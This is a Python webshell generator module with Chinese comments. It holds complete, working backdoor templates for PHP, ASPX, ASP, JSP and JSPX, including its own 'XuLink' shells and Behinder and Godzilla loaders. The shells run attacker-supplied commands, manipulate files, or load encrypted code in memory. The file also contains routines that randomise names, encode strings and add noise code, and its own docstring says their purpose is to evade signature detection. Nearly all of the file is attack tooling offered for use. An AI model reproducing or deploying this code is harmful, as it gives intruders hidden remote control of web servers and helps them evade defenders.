"""ShadowHalberd默认 WebShell 代码生成器

每次生成都会使用随机变量名、字符串重构方式、控制流包装和噪音代码，
让生成的 PHP 代码静态特征不固定，降低被直接匹配的概率。
"""

import base64 as _base64
import random
import string


VALID_PASSWORD_CHARS = set(string.ascii_letters + string.digits + "_-")

_WEBSHELL_TEMPLATES = {
    "ghost_aspx": """<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
private static string JsonEscape(string s)
{{
    if (s == null) return "";
    return s.Replace("\\\\", "\\\\\\\\").Replace("\\\"", "\\\\\\\"").Replace("\\n", "\\\\\\\\n").Replace("\\r", "\\\\\\\\r");
}}
private static void CopyDirectory(string src, string dst)
{{
    Directory.CreateDirectory(dst);
    foreach (string file in Directory.GetFiles(src))
    {{
        File.Copy(file, Path.Combine(dst, Path.GetFileName(file)), true);
    }}
    foreach (string dir in Directory.GetDirectories(src))
    {{
        CopyDirectory(dir, Path.Combine(dst, Path.GetFileName(dir)));
    }}
}}
protected void Page_Load(object sender, EventArgs e)
{{
    string {pw_var} = "{password}";
    if (Request[{pw_var}] == null) return;
    try
    {{
        string data = Encoding.UTF8.GetString(Convert.FromBase64String(Request[{pw_var}]));
        string[] parts = data.Split(new char[] {{ '|' }}, 3);
        string action = parts[0];
        if (action == "cmd")
        {{
            string cmd = data.Substring(4);
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + cmd;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardError = true;
            p.StartInfo.CreateNoWindow = true;
            p.Start();
            Response.Write(p.StandardOutput.ReadToEnd());
            Response.Write(p.StandardError.ReadToEnd());
            p.WaitForExit();
        }}
        else if (action == "list")
        {{
            string path = parts[1];
            DirectoryInfo di = new DirectoryInfo(path);
            StringBuilder sb = new StringBuilder("[");
            foreach (DirectoryInfo d in di.GetDirectories())
            {{
                sb.Append("{{\\\"name\\\":\\\"" + JsonEscape(d.Name) + "\\\",\\\"type\\\":\\\"dir\\\",\\\"size\\\":0}},");
            }}
            foreach (FileInfo f in di.GetFiles())
            {{
                sb.Append("{{\\\"name\\\":\\\"" + JsonEscape(f.Name) + "\\\",\\\"type\\\":\\\"file\\\",\\\"size\\\":" + f.Length + "}},");
            }}
            if (sb.Length > 1) sb.Length--;
            sb.Append("]");
            Response.Write(sb.ToString());
        }}
        else if (action == "read")
        {{
            Response.Write(Convert.ToBase64String(File.ReadAllBytes(parts[1])));
        }}
        else if (action == "write")
        {{
            File.WriteAllBytes(parts[1], Convert.FromBase64String(parts[2]));
            Response.Write("ok");
        }}
        else if (action == "delete")
        {{
            if (File.Exists(parts[1])) File.Delete(parts[1]);
            else if (Directory.Exists(parts[1])) Directory.Delete(parts[1], true);
            Response.Write("ok");
        }}
        else if (action == "mkdir")
        {{
            Directory.CreateDirectory(parts[1]);
            Response.Write("ok");
        }}
        else if (action == "move")
        {{
            if (File.Exists(parts[1])) File.Move(parts[1], parts[2]);
            else if (Directory.Exists(parts[1])) Directory.Move(parts[1], parts[2]);
            Response.Write("ok");
        }}
        else if (action == "copy")
        {{
            if (File.Exists(parts[1])) File.Copy(parts[1], parts[2], true);
            else if (Directory.Exists(parts[1])) CopyDirectory(parts[1], parts[2]);
            Response.Write("ok");
        }}
    }}
    catch (Exception ex)
    {{
        Response.Write("err:" + ex.Message);
    }}
}}
</script>""",
    "ghost_jsp": """<%@ page import="java.util.*,java.io.*,java.util.Base64" %>
<%
String {pw_var} = "{password}";
String p = request.getParameter({pw_var});
if (p != null) {{
    byte[] b = Base64.getDecoder().decode(p);
    String cmd = new String(b, "UTF-8");
    Process proc = Runtime.getRuntime().exec(new String[]{{"/bin/sh", "-c", cmd}});
    BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {{
        out.println(line);
    }}
    br = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
    while ((line = br.readLine()) != null) {{
        out.println(line);
    }}
}}
%>""",
}


def _rand_var(length: int = 0) -> str:
    if length <= 0:
        length = random.randint(3, 8)
    first = random.choice(string.ascii_letters + "_")
    rest = "".join(random.choices(string.ascii_letters + string.digits + "_", k=length - 1))
    return first + rest


def _rand_comment() -> str:
    """生成随机注释噪音"""
    words = [
        "config", "init", "setup", "load", "core", "main", "entry", "bootstrap",
        "helper", "utils", "common", "lib", "module", "plugin", "handler",
    ]
    return " ".join(random.choices(words, k=random.randint(2, 5)))


def _split_concat(s: str) -> str:
    """把字符串拆成若干段并用 '.' 拼接，例如 'abc' -> 'a'.'bc'"""
    if len(s) <= 1:
        return repr(s)
    parts = []
    i = 0
    while i < len(s):
        step = random.randint(1, max(1, len(s) - i))
        parts.append(s[i : i + step])
        i += step
    return ".".join(repr(p) for p in parts)


def _encode_base64_const(s: str) -> str:
    """base64('...') 常量解码"""
    b = _base64.b64encode(s.encode()).decode()
    return f"base64_decode({_split_concat(b)})"


def _encode_hex2bin(s: str) -> str:
    """hex2bin('...') 常量解码"""
    hx = s.encode().hex()
    return f"hex2bin({_split_concat(hx)})"


def _encode_strrev(s: str) -> str:
    """strrev('...') 倒序常量"""
    return f"strrev({_split_concat(s[::-1])})"


def _encode_chr_list(s: str) -> str:
    """implode(array_map('chr', [...]))"""
    nums = ",".join(str(ord(c)) for c in s)
    # 随机拆分 chr 字符串
    chr_concat = _split_concat("chr")
    return f"join(array_map({chr_concat}, array({nums})))"


def _encode_password(password: str) -> str:
    """随机选择一种方式在 PHP 中重建密码字符串"""
    encoders = [
        lambda p: _split_concat(p),
        lambda p: _encode_base64_const(p),
        lambda p: _encode_hex2bin(p),
        lambda p: _encode_strrev(p),
        lambda p: _encode_chr_list(p),
    ]
    return random.choice(encoders)(password)


def _encode_func_name(name: str) -> str:
    """对函数名 eval / base64_decode 做字符串重构"""
    methods = [
        lambda n: _split_concat(n),
        lambda n: _encode_base64_const(n),
        lambda n: _encode_chr_list(n),
    ]
    return random.choice(methods)(name)


def _dead_code(indent: str = "") -> str:
    """生成无害的随机噪音变量赋值"""
    lines = []
    for _ in range(random.randint(1, 3)):
        v = _rand_var()
        val = random.choice([
            repr("".join(random.choices(string.ascii_letters, k=random.randint(4, 10)))),
            str(random.randint(100, 9999)),
        ])
        lines.append(f"{indent}${v} = {val};")
    return "\n".join(lines)


def _generate_php_webshell(password: str) -> str:
    """生成随机混淆的 PHP WebShell

    核心行为保持不变：
        eval($_POST[password])
    客户端使用 base64 编码器时发送 eval(base64_decode("..."))，
    服务端直接 eval 接收到的 PHP 代码即可执行。
    通过随机变量名、字符串重构、控制流包装和噪音代码让每次生成的源码静态特征不同。
    """
    pw_expr = _encode_password(password)

    pw_var = _rand_var()
    data_var = _rand_var()

    req_source = random.choice(["$_POST", "$_REQUEST"])
    check_method = random.choice([
        f"isset({req_source}[${pw_var}])",
        f"array_key_exists(${pw_var}, {req_source})",
    ])

    body_lines = [
        f"${pw_var} = {pw_expr};",
    ]

    # 随机添加噪音变量
    if random.random() < 0.7:
        body_lines.insert(random.randint(1, len(body_lines)), _dead_code("    "))

    body = "\n    ".join(body_lines)

    # 多种调用形式，避免固定写法
    call_templates = [
        f"if ({check_method}) {{\n        @eval({req_source}[${pw_var}]);\n    }}",
        f"({check_method}) && @eval({req_source}[${pw_var}]);",
        f"${data_var} = {req_source}[${pw_var}] ?? '';\n    if (${data_var}) {{\n        @eval(${data_var});\n    }}",
    ]
    call_block = random.choice(call_templates)

    # 随机顶部注释和噪音注释
    top_comment = _rand_comment()
    noise_comments = "\n".join(f"// {_rand_comment()}" for _ in range(random.randint(0, 3)))
    if noise_comments:
        noise_comments += "\n"

    code = f"""<?php
// {top_comment}
{noise_comments}session_start();
{body}
    {call_block}
?>"""
    return code


def validate_password(password: str) -> None:
    if not password:
        raise ValueError("密码不能为空")
    if not all(c in VALID_PASSWORD_CHARS for c in password):
        raise ValueError("密码只能包含字母、数字、下划线和连字符")



# WebShell 生成器扩展：支持冰蝎(Behinder)与哥斯拉(Godzilla)
# 模板参考公开实现，PHP/JSP/JSPX/ASP/ASPX 分别使用对应语言的标准加载器。

import hashlib
import typing as t

from . import webshell_obfuscate


_GODZILLA_TEMPLATES = {
    "php_xor_base64": '<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass=\'{{PWD}}\'; $payloadName=\'payload\'; $keyFlag=\'{{KEY}}\'; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$keyFlag); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$keyFlag); eval($payload); echo substr(md5($pass.$keyFlag),0,16); echo base64_encode(encode(@run($data),$keyFlag)); echo substr(md5($pass.$keyFlag),16); }else{ if (stripos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$keyFlag); } } }',
    "php_xor_raw": '<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $payloadName=\'payload\'; $keyFlag=\'{{KEY}}\'; $data=file_get_contents("php://input"); if ($data!==false){ $data=encode($data,$keyFlag); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$keyFlag); \t\teval($payload); echo encode(@run($data),$keyFlag); }else{ if (stripos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$keyFlag); } } }',
    "asp_xor_base64": '\n<%\nSet bypassDictionary = Server.CreateObject("Scripting.Dictionary")\n\nFunction Base64Decode(ByVal vCode)\n    Dim oXML, oNode\n    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")\n    Set oNode = oXML.CreateElement("base64")\n    oNode.dataType = "bin.base64"\n    oNode.text = vCode\n    Base64Decode = oNode.nodeTypedValue\n    Set oNode = Nothing\n    Set oXML = Nothing\nEnd Function\n\nFunction Base64Encode(sData)\n    Dim oXML, oNode\n    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")\n    Set oNode = oXML.CreateElement("base64")\n    oNode.dataType = "bin.base64"\n    oNode.nodeTypedValue = sData\n    Base64Encode = Replace(oNode.text, vbLf, "")\n    Set oNode = Nothing\n    Set oXML = Nothing\nEnd Function\n\nFunction decryption(content,isBin)\n    dim size,i,result,keySize\n    keySize = len(keyFlag)\n    Set BinaryStream = CreateObject("ADODB.Stream")\n    BinaryStream.CharSet = "iso-8859-1"\n    BinaryStream.Type = 2\n    BinaryStream.Open\n    if IsArray(content) then\n        size=UBound(content)+1\n        For i=1 To size\n            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(keyFlag,(i mod keySize)+1,1)))\n        Next\n    end if\n    BinaryStream.Position = 0\n    if isBin then\n        BinaryStream.Type = 1\n        decryption=BinaryStream.Read()\n    else\n        decryption=BinaryStream.ReadText()\n    end if\n\nEnd Function\n    keyFlag="{{KEY}}"\n    content=request.Form("{{PWD}}")\n    content=Replace(content," ","+")\n    if not IsEmpty(content) then\n\n        if  IsEmpty(Session("payload")) then\n            content=decryption(Base64Decode(content),false)\n            Session("payload")=content\n            response.End\n        else\n            content=decryption(Base64Decode(content),true)\n            bypassDictionary.Add "payload",Session("payload")\n            Execute(bypassDictionary("payload"))\n            result=run(content)\n            response.Write("11cd6a")\n            if not IsEmpty(result) then\n                response.Write Base64Encode(decryption(result,true))\n            end if\n            response.Write("ac826a")\n        end if\n    end if\n%>',
    "asp_xor_raw": '\n<%\nSet bypassDictionary = Server.CreateObject("Scripting.Dictionary")\n\nFunction decryption(content,isBin)\n    dim size,i,result,keySize\n    keySize = len(keyFlag)\n    Set BinaryStream = CreateObject("ADODB.Stream")\n    BinaryStream.CharSet = "iso-8859-1"\n    BinaryStream.Type = 2\n    BinaryStream.Open\n    if IsArray(content) then\n        size=UBound(content)+1\n        For i=1 To size\n            BinaryStream.WriteText chrw(ascb(midb(content,i,1)) Xor Asc(Mid(keyFlag,(i mod keySize)+1,1)))\n        Next\n    end if\n    BinaryStream.Position = 0\n    if isBin then\n        BinaryStream.Type = 1\n        decryption=BinaryStream.Read()\n    else\n        decryption=BinaryStream.ReadText()\n    end if\n\nEnd Function\n    keyFlag="{{KEY}}"\n    content=Request.BinaryRead(Request.TotalBytes)\n    if not IsEmpty(content) then\n\n        if  IsEmpty(Session("payload")) then\n            content=decryption(content,false)\n            Session("payload")=content\n            response.End\n        else\n            content=decryption(content,true)\n            bypassDictionary.Add "payload",Session("payload")\n            Execute(bypassDictionary("payload"))\n            result=run(content)\n            if not IsEmpty(result) then\n                response.BinaryWrite decryption(result,true)\n            end if\n        end if\n    end if\n%>',
    "aspx_aes_base64": '<%@ Page Language="C#"%><%try{string keyFlag = "{{KEY}}";string pass = "{{PWD}}";string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + keyFlag))).Replace("-", "");byte[] data = System.Convert.FromBase64String(Context.Request[pass].Replace(" ", "+"));data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(keyFlag), System.Text.Encoding.Default.GetBytes(keyFlag)).TransformFinalBlock(data, 0, data.Length);Environment.CurrentDirectory = Server.MapPath(".");if (Context.Session["payload"] == null){ Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ;}else{ object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); System.IO.MemoryStream outStream = new System.IO.MemoryStream();o.Equals(outStream);o.Equals(Context); o.Equals(data);o.ToString(); byte[] r = outStream.ToArray();outStream.Dispose(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(keyFlag), System.Text.Encoding.Default.GetBytes(keyFlag)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16));}}catch(System.Exception){} %>',
    "aspx_aes_raw": '<%@ Page Language="C#"%><%try{string keyFlag = "{{KEY}}";byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(keyFlag), System.Text.Encoding.Default.GetBytes(keyFlag)).TransformFinalBlock(Context.Request.BinaryRead(Context.Request.ContentLength), 0, Context.Request.ContentLength);Environment.CurrentDirectory = Server.MapPath(".");if (Context.Session["payload"] == null){ Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });}else{ object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); System.IO.MemoryStream outStream = new System.IO.MemoryStream();o.Equals(outStream);o.Equals(Context); o.Equals(data);o.ToString();byte[] r = outStream.ToArray();outStream.Dispose();Context.Response.BinaryWrite(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(keyFlag), System.Text.Encoding.Default.GetBytes(keyFlag)).TransformFinalBlock(r, 0, r.Length));}}catch(System.Exception){} %>',
    "jsp_aes_base64": '<%! String xc="{{KEY}}"; String pass="{{PWD}}"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><% try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(pageContext.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();byte[] r=arrOut.toByteArray();response.getOutputStream().write(md5.substring(0,16).getBytes());response.getOutputStream().write(base64Encode(x(r, true)).getBytes());response.getOutputStream().write(md5.substring(16).getBytes());} }catch (Exception e){}%>',
    "jsp_aes_raw": '<%! String xc="{{KEY}}"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}%><%try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))<data.length);data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}%>',
    "jspx_aes_base64": '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:declaration> String xc="{{KEY}}"; String pass="{{PWD}}"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }</jsp:declaration><jsp:scriptlet>try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);f.toString();byte[] r=arrOut.toByteArray();response.getOutputStream().write(md5.substring(0,16).getBytes());response.getOutputStream().write(base64Encode(x(r, true)).getBytes());response.getOutputStream().write(md5.substring(16).getBytes());} }catch (Exception e){}</jsp:scriptlet></jsp:root>',
    "jspx_aes_raw": '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:declaration> String xc="{{KEY}}"; class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }}</jsp:declaration><jsp:scriptlet>try{byte[] data=new byte[Integer.parseInt(request.getHeader("Content-Length"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters", data);Object f=((Class)session.getAttribute("payload")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));} }catch (Exception e){}</jsp:scriptlet></jsp:root>',
}

_BEHINDER_TEMPLATES = {
    "php_aes": '<?php @error_reporting(0);session_start(); $key="{{PWD}}"; $_SESSION[\'k\']=$key; session_write_close(); $post=file_get_contents("php://input"); $post=base64_decode($post); if(!extension_loaded(\'openssl\')){ die(); } $post=openssl_decrypt($post, "AES-128-CBC", $key, OPENSSL_RAW_DATA, str_repeat("\\0",16)); if($post===false){ die(); } $arr=explode(\'|\',$post); $params=$arr[1]; class C{public function __invoke($p) {eval($p."");}} @call_user_func(new C(),$params);?>',
    "php_xor": '<?php @error_reporting(0);session_start(); $key="{{PWD}}"; $_SESSION[\'k\']=$key; session_write_close(); $post=file_get_contents("php://input"); $post=base64_decode($post); for($i=0;$i<strlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1&15]; } $arr=explode(\'|\',$post); $params=$arr[1]; class C{public function __invoke($p) {eval($p."");}} @call_user_func(new C(),$params);?>',
    "jsp_aes": '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,java.util.Base64"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="{{PWD}}";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);}%>',
    "jspx_aes": '<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,java.util.Base64"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k="{{PWD}}";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec((session.getValue("u")+"").getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>',
    "asp_xor": '<%\nResponse.CharSet = "UTF-8"\nkeyFlag="{{PWD}}"\nSession("k")=keyFlag\nsize=Request.TotalBytes\ncontent=Request.BinaryRead(size)\nFor i=1 To size\nresult=result&Chr(ascb(midb(content,i,1)) Xor Asc(Mid(keyFlag,(i and 15)+1,1)))\nNext\nexecute(result)\n%>',
    "aspx_aes": '<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%@Import Namespace="System.Text"%><%Session.Add("k","{{PWD}}"); byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Environment.CurrentDirectory = Server.MapPath(".");Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%> ',
}


def _secret_key(pwd: str) -> str:
    return hashlib.md5(pwd.encode()).hexdigest()[:16]


def _validate_ghost_password(password: str) -> None:
    if not password:
        raise ValueError("密码不能为空")
    if not all(c in VALID_PASSWORD_CHARS for c in password):
        raise ValueError("密码只能包含字母、数字、下划线和连字符")


def _validate_wsm_password(password: str) -> None:
    if not password:
        raise ValueError("密码不能为空")


def _validate_key(key: str) -> None:
    if not key:
        raise ValueError("Key 不能为空")


def _apply_placeholders(template: str, pwd: str, key: t.Optional[str] = None) -> str:
    template = template.replace("{{PWD}}", pwd)
    if key is not None:
        template = template.replace("{{KEY}}", key)
    return template


def generate_webshell(webshell_type: str, password: str, key: t.Optional[str] = None) -> str:
    """根据类型和密码生成 WebShell 代码"""
    if webshell_type.startswith("ghost_"):
        _validate_ghost_password(password)
        if webshell_type == "ghost_php":
            return _generate_php_webshell(password)
        template = _WEBSHELL_TEMPLATES.get(webshell_type)
        if template is None:
            raise ValueError(f"不支持的 WebShell 类型：{webshell_type}")
        escaped_password = password.replace("\\", "\\").replace('"', '\"')
        pw_var = _rand_var()
        result = template.format(password=escaped_password, pw_var=pw_var)
        if webshell_type == "ghost_aspx":
            result = webshell_obfuscate.obfuscate_csharp(result)
        return result

    if webshell_type.startswith("behinder_"):
        _validate_wsm_password(password)
        sub = webshell_type.split("behinder_", 1)[1]
        template = _BEHINDER_TEMPLATES.get(sub)
        if template is None:
            raise ValueError(f"不支持的 WebShell 类型：{webshell_type}")
        result = _apply_placeholders(template, _secret_key(password))
        if sub == "asp_xor":
            result = webshell_obfuscate.obfuscate_vbscript(result)
        elif sub == "aspx_aes":
            result = webshell_obfuscate.obfuscate_csharp(result)
        return result

    if webshell_type.startswith("godzilla_"):
        _validate_wsm_password(password)
        _validate_key(key)
        sub = webshell_type.split("godzilla_", 1)[1]
        template = _GODZILLA_TEMPLATES.get(sub)
        if template is None:
            raise ValueError(f"不支持的 WebShell 类型：{webshell_type}")
        result = _apply_placeholders(template, _secret_key(password), _secret_key(key))
        if sub.startswith("asp_xor_"):
            result = webshell_obfuscate.obfuscate_vbscript(result)
        elif sub.startswith("aspx_aes_"):
            result = webshell_obfuscate.obfuscate_csharp(result)
        return result

    raise ValueError(f"不支持的 WebShell 类型：{webshell_type}")


WEBSHELL_GENERATOR_TYPES = [
    {"id": "ghost_php", "name": "XuLink PHP", "need_key": False},
    {"id": "ghost_aspx", "name": "XuLink ASPX", "need_key": False},
    {"id": "ghost_jsp", "name": "XuLink JSP", "need_key": False},
    {"id": "behinder_php_aes", "name": "Behinder PHP AES", "need_key": False},
    {"id": "behinder_php_xor", "name": "Behinder PHP XOR", "need_key": False},
    {"id": "behinder_jsp_aes", "name": "Behinder JSP AES", "need_key": False},
    {"id": "behinder_jspx_aes", "name": "Behinder JSPX AES", "need_key": False},
    {"id": "behinder_asp_xor", "name": "Behinder ASP XOR", "need_key": False},
    {"id": "behinder_aspx_aes", "name": "Behinder ASPX AES", "need_key": False},
    {"id": "godzilla_php_xor_base64", "name": "Godzilla PHP XOR BASE64", "need_key": True},
    {"id": "godzilla_php_xor_raw", "name": "Godzilla PHP XOR RAW", "need_key": True},
    {"id": "godzilla_asp_xor_base64", "name": "Godzilla ASP XOR BASE64", "need_key": True},
    {"id": "godzilla_asp_xor_raw", "name": "Godzilla ASP XOR RAW", "need_key": True},
    {"id": "godzilla_aspx_aes_base64", "name": "Godzilla ASPX AES BASE64", "need_key": True},
    {"id": "godzilla_aspx_aes_raw", "name": "Godzilla ASPX AES RAW", "need_key": True},
    {"id": "godzilla_jsp_aes_base64", "name": "Godzilla JSP AES BASE64", "need_key": True},
    {"id": "godzilla_jsp_aes_raw", "name": "Godzilla JSP AES RAW", "need_key": True},
    {"id": "godzilla_jspx_aes_base64", "name": "Godzilla JSPX AES BASE64", "need_key": True},
    {"id": "godzilla_jspx_aes_raw", "name": "Godzilla JSPX AES RAW", "need_key": True},
]